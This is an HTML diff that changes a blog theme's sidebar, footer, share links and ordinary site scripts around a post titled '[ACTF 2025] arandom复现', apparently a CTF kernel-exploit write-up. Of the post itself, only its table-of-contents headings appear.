-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
+    </div>
 
-  <aside class="sidebar">
-    <div class="sidebar-inner">
 
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="nav-number">1.</span> <span class="nav-text">防护检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">逆向分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E5%A0%86%E5%96%B7%E5%AF%B9%E8%B1%A1"><span class="nav-number">3.1.</span> <span class="nav-text">寻找堆喷对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E5%A0%86%E5%96%B7%E5%AF%B9%E8%B1%A1%EF%BC%9Astruct-msg-msg"><span class="nav-number">3.2.</span> <span class="nav-text">错误的堆喷对象：struct msg_msg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E6%8D%A2%E5%A0%86%E5%96%B7%E5%AF%B9%E8%B1%A1%EF%BC%9Astruct-sk-buff"><span class="nav-number">3.3.</span> <span class="nav-text">更换堆喷对象：struct sk_buff</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E6%89%A7%E8%A1%8C%E6%B5%81%EF%BC%9Astruct-pipe-buffer"><span class="nav-number">3.4.</span> <span class="nav-text">控制执行流：struct pipe_buffer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%8A%9Fget-root"><span class="nav-number">3.5.</span> <span class="nav-text">成功get root</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E7%BB%88Exp%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">最终Exp（部分）</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">NazrinDuck</p>
-  <div class="site-description" itemprop="description">Fâtih'in İstanbul'u fethettiği yaştasın!</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
         
-          <span class="site-state-item-count">14</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">11</span>
-        <span class="site-state-item-name">tags</span>
-      </div>
-  </nav>
-</div>
+          <div id="footer-post-container">
+  <div id="footer-post">
 
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/NazrinDuck">Projects</a></li>
+        
+          <li><a href="/tags">tags</a></li>
+        
+      </ul>
+    </div>
 
-
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="toc-number">1.</span> <span class="toc-text">防护检查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%A0%86%E5%96%B7%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.1.</span> <span class="toc-text">寻找堆喷对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E5%A0%86%E5%96%B7%E5%AF%B9%E8%B1%A1%EF%BC%9Astruct-msg-msg"><span class="toc-number">3.2.</span> <span class="toc-text">错误的堆喷对象：struct msg_msg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%8D%A2%E5%A0%86%E5%96%B7%E5%AF%B9%E8%B1%A1%EF%BC%9Astruct-sk-buff"><span class="toc-number">3.3.</span> <span class="toc-text">更换堆喷对象：struct sk_buff</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%89%A7%E8%A1%8C%E6%B5%81%EF%BC%9Astruct-pipe-buffer"><span class="toc-number">3.4.</span> <span class="toc-text">控制执行流：struct pipe_buffer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9Fget-root"><span class="toc-number">3.5.</span> <span class="toc-text">成功get root</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88Exp%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">最终Exp（部分）</span></a></li></ol>
       </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/14/ACTF-arandom/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/14/ACTF-arandom/&text=[ACTF 2025] arandom复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/14/ACTF-arandom/&title=[ACTF 2025] arandom复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/14/ACTF-arandom/&is_video=false&description=[ACTF 2025] arandom复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[ACTF 2025] arandom复现&body=Check out this article: http://example.com/2025/05/14/ACTF-arandom/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/14/ACTF-arandom/&title=[ACTF 2025] arandom复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/14/ACTF-arandom/&title=[ACTF 2025] arandom复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/14/ACTF-arandom/&title=[ACTF 2025] arandom复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/14/ACTF-arandom/&title=[ACTF 2025] arandom复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/14/ACTF-arandom/&name=[ACTF 2025] arandom复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/14/ACTF-arandom/&t=[ACTF 2025] arandom复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
 
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
 
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
         
-
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
         
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
 
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2025</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">NazrinDuck</span>
+  </div>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
-  </div>
 
         
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    NazrinDuck
   </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/NazrinDuck">Projects</a></li><!--
+     --><!--
+       --><li><a href="/tags">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
 
   
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
   
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
 
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
+<!-- Baidu Analytics -->
 
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
 
+<!-- Cloudflare Analytics -->
 
+<!-- Disqus Comments -->
 
+<!-- utterances Comments -->
 
+    <script type="text/javascript">
+      var utterances_repo = 'NazrinDuck/NazrinDuck.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
 
+      (function(){
+          var script = document.createElement('script');
 
-
-
-
-
-  
-
-  
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
 
 </body>
 </html>
